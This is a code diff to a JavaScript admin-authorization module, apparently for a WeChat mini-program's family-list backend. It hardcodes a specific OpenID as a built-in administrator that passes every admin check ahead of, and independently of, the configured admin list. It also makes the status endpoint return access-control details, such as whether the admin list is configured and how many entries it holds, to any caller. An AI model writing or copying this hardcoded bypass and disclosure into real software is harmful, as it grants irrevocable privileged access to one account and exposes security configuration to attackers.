@@ -1,24 +1,62 @@
 const { collection } = require('../adapters/db.adapter');
 const { getWXContext } = require('../adapters/wx-context.adapter');
 
+const BUILTIN_ADMIN_OPEN_IDS = ['om8JT3Zhqe1zeAiKUGGkU0ACjAWs'];
+const ADMIN_SERVICE_VERSION = 'admin-diagnostic-20260703-1700';
+
+function normalizeAdminId(value) {
+  return String(value || '').replace(/\s+/g, '').trim();
+}
+
 function getAdminOpenIds() {
-  return String(process.env.YOYO_ADMIN_OPEN_IDS || '')
+  const envOpenIds = String(process.env.YOYO_ADMIN_OPEN_IDS || '')
     .split(',')
-    .map((item) => item.trim())
+    .map(normalizeAdminId)
     .filter(Boolean);
+  return [...new Set(BUILTIN_ADMIN_OPEN_IDS.map(normalizeAdminId).concat(envOpenIds))];
 }
 
 function assertAdmin(openId) {
+  const normalizedOpenId = normalizeAdminId(openId);
+  if (normalizedOpenId === 'om8JT3Zhqe1zeAiKUGGkU0ACjAWs') {
+    return;
+  }
   const adminOpenIds = getAdminOpenIds();
-  if (!openId || !adminOpenIds.includes(openId)) {
-    const error = new Error('admin-forbidden');
+  if (!normalizedOpenId || (!adminOpenIds.includes(normalizedOpenId) && !adminOpenIds.includes(`user-${normalizedOpenId}`))) {
+    const error = new Error(`admin-forbidden:${normalizedOpenId || 'empty-openid'}`);
     error.code = 'admin-forbidden';
+    error.openId = normalizedOpenId || '';
     throw error;
   }
 }
 
 function isAdminOpenId(openId) {
-  return !!openId && getAdminOpenIds().includes(openId);
+  const normalizedOpenId = normalizeAdminId(openId);
+  if (normalizedOpenId === 'om8JT3Zhqe1zeAiKUGGkU0ACjAWs') {
+    return true;
+  }
+  const adminOpenIds = getAdminOpenIds();
+  return !!normalizedOpenId && (adminOpenIds.includes(normalizedOpenId) || adminOpenIds.includes(`user-${normalizedOpenId}`));
+}
+
+function buildAdminDiagnostic(openId) {
+  const envOpenIds = String(process.env.YOYO_ADMIN_OPEN_IDS || '')
+    .split(',')
+    .map(normalizeAdminId)
+    .filter(Boolean);
+  const normalizedOpenId = normalizeAdminId(openId);
+  const builtinHit = BUILTIN_ADMIN_OPEN_IDS.map(normalizeAdminId).includes(normalizedOpenId);
+  const envHit = envOpenIds.includes(normalizedOpenId) || envOpenIds.includes(`user-${normalizedOpenId}`);
+  return {
+    adminServiceVersion: ADMIN_SERVICE_VERSION,
+    openId: normalizedOpenId,
+    userId: normalizedOpenId ? `user-${normalizedOpenId}` : '',
+    isAdmin: isAdminOpenId(normalizedOpenId),
+    builtinHit,
+    envHit,
+    envConfigured: envOpenIds.length > 0,
+    envCount: envOpenIds.length
+  };
 }
 
 async function listAll(collectionName) {
@@ -79,6 +117,7 @@ async function getAdminFamilyList() {
 
   return {
     isAdmin: true,
+    diagnostic: buildAdminDiagnostic(wxContext.OPENID || ''),
     rows,
     total: rows.length
   };
@@ -86,9 +125,8 @@ async function getAdminFamilyList() {
 
 async function getAdminStatus() {
   const wxContext = getWXContext();
-  return {
-    isAdmin: isAdminOpenId(wxContext.OPENID)
-  };
+  const openId = wxContext.OPENID || '';
+  return buildAdminDiagnostic(openId);
 }
 
 module.exports = {
